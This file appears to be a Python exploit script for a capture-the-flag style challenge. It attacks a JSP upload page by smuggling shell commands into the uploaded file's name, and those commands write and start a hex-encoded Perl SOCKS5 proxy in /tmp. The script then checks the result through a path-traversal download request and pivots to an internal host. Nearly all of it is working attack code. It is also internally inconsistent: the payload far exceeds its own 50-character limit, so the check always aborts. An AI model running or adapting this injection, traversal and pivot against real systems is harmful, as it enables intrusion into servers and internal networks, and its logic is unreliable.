#!/usr/bin/env python3
import requests
import time
import sys

# Configuration
TARGET_URL = "http://localhost:8080"
UPLOAD_URL = f"{TARGET_URL}/upload.jsp"
DOWNLOAD_URL = f"{TARGET_URL}/download.jsp"

def create_socks_payload():
    """Create the SOCKS5 proxy Perl code as a command injection payload"""
    
    # SOCKS5 proxy Perl code (minimal version for command injection)
    socks_code = '''#!/usr/bin/perl
use IO::Socket::INET;
use IO::Select;
$s=IO::Socket::INET->new(LocalHost=>"127.0.0.1",LocalPort=>1080,Proto=>"tcp",Listen=>5,Reuse=>1)or die"$!";
print"SOCKS5 on 1080\\n";
while($c=$s->accept()){
if(fork()==0){
$c->sysread($b,2);
($v,$n)=unpack("CC",$b);
$c->sysread($b,$n);
$c->syswrite(pack("CC",5,0));
$c->sysread($b,4);
($v,$cmd,$r,$a)=unpack("CCCC",$b);
$c->sysread($b,1);
$l=unpack("C",$b);
$c->sysread($b,$l);
$addr=$b;
$c->sysread($b,2);
$port=unpack("n",$b);
$r=IO::Socket::INET->new(PeerHost=>$addr,PeerPort=>$port,Proto=>"tcp")or next;
$c->syswrite(pack("CCCC",5,0,0,1).pack("NN",0,0));
$sel=IO::Select->new($c,$r);
while(@rdy=$sel->can_read()){
foreach$fh(@rdy){
$o=($fh eq$c)?$r:$c;
$fh->sysread($d,4096);
$o->syswrite($d);
}
}
exit;
}
$c->close();
}'''
    
    # Encode the code to fit in filename (avoiding / and \ characters)
    # Convert to hex and create a command that writes the file
    hex_code = socks_code.encode().hex()
    
    # Create command injection payload
    # The payload will:
    # 1. Create the Perl script file
    # 2. Make it executable
    # 3. Run it in background
    
    payload_parts = [
        # Create the Perl script
        "echo -n '" + hex_code + "' | perl -e 'print pack(\"H*\",<STDIN>)' > /tmp/socks.pl",
        # Make it executable
        "chmod +x /tmp/socks.pl",
        # Run it in background
        "/tmp/socks.pl &",
        # Create a marker file to indicate success
        "echo 'SOCKS5 started' > /tmp/socks_status.txt"
    ]
    
    # Combine all commands with semicolons
    full_command = ";".join(payload_parts)
    
    # Escape single quotes for the command injection
    escaped_command = full_command.replace("'", "'\"'\"'")
    
    # Create the final filename payload
    filename = f"';{escaped_command};echo '"
    
    return filename

def upload_file(filename):
    """Upload a file with the malicious filename"""
    files = {'file': ('dummy.txt', 'dummy content', 'text/plain')}
    data = {}
    
    # Override the filename in the multipart data
    # We need to manually construct the multipart data to inject our payload
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    
    body = f"""--{boundary}\r
Content-Disposition: form-data; name="file"; filename="{filename}"\r
Content-Type: text/plain\r
\r
dummy content\r
--{boundary}--\r
"""
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body))
    }
    
    response = requests.post(UPLOAD_URL, data=body, headers=headers)
    return response

def check_socks_status():
    """Check if SOCKS5 proxy is running by trying to download status file"""
    try:
        response = requests.get(f"{DOWNLOAD_URL}?file=../tmp/socks_status.txt")
        if response.status_code == 200 and "SOCKS5 started" in response.text:
            return True
    except:
        pass
    return False

def test_socks_connection():
    """Test the SOCKS5 proxy connection"""
    try:
        import socket
        import struct
        
        # Create SOCKS5 client connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 1080))
        
        # SOCKS5 handshake
        sock.send(b'\x05\x01\x00')  # Version 5, 1 auth method, no auth
        response = sock.recv(2)
        if response != b'\x05\x00':
            print("SOCKS5 handshake failed")
            return False
        
        # SOCKS5 connect request to internal_web:5000
        # Domain name: internal_web (11 bytes) + port 5000
        request = b'\x05\x01\x00\x03\x0binternal_web\x13\x88'
        sock.send(request)
        
        response = sock.recv(10)
        if len(response) < 4 or response[1] != 0:
            print("SOCKS5 connect failed")
            return False
        
        # Send HTTP request
        http_request = b"GET / HTTP/1.1\r\nHost: internal_web:5000\r\nConnection: close\r\n\r\n"
        sock.send(http_request)
        
        # Read response
        data = sock.recv(1024)
        sock.close()
        
        if b"Congratulation" in data:
            print("SUCCESS! SOCKS5 proxy is working!")
            print("Response:", data.decode('utf-8', errors='ignore'))
            return True
        else:
            print("SOCKS5 proxy connected but no expected response")
            return False
            
    except Exception as e:
        print(f"Error testing SOCKS5: {e}")
        return False

def main():
    print("=== SOCKS5 Proxy via Command Injection Exploit ===")
    print(f"Target: {TARGET_URL}")
    
    # Create the payload
    print("\n1. Creating SOCKS5 proxy payload...")
    filename = create_socks_payload()
    print(f"Payload length: {len(filename)} characters")
    
    # Check if payload is within limits
    if len(filename) >= 50:
        print("ERROR: Payload too long! Must be under 50 characters.")
        return
    
    # Upload the file
    print("\n2. Uploading file with malicious filename...")
    response = upload_file(filename)
    print(f"Upload response: {response.status_code}")
    
    # Wait for SOCKS5 to start
    print("\n3. Waiting for SOCKS5 proxy to start...")
    for i in range(10):
        if check_socks_status():
            print("SOCKS5 proxy started successfully!")
            break
        time.sleep(1)
        print(f"Waiting... ({i+1}/10)")
    else:
        print("Failed to start SOCKS5 proxy")
        return
    
    # Test the SOCKS5 connection
    print("\n4. Testing SOCKS5 proxy connection...")
    if test_socks_connection():
        print("\n=== EXPLOIT SUCCESSFUL ===")
        print("You can now use the SOCKS5 proxy at 127.0.0.1:1080")
        print("Example: curl --socks5 127.0.0.1:1080 http://internal_web:5000/")
    else:
        print("\n=== EXPLOIT FAILED ===")

if __name__ == "__main__":
    main()




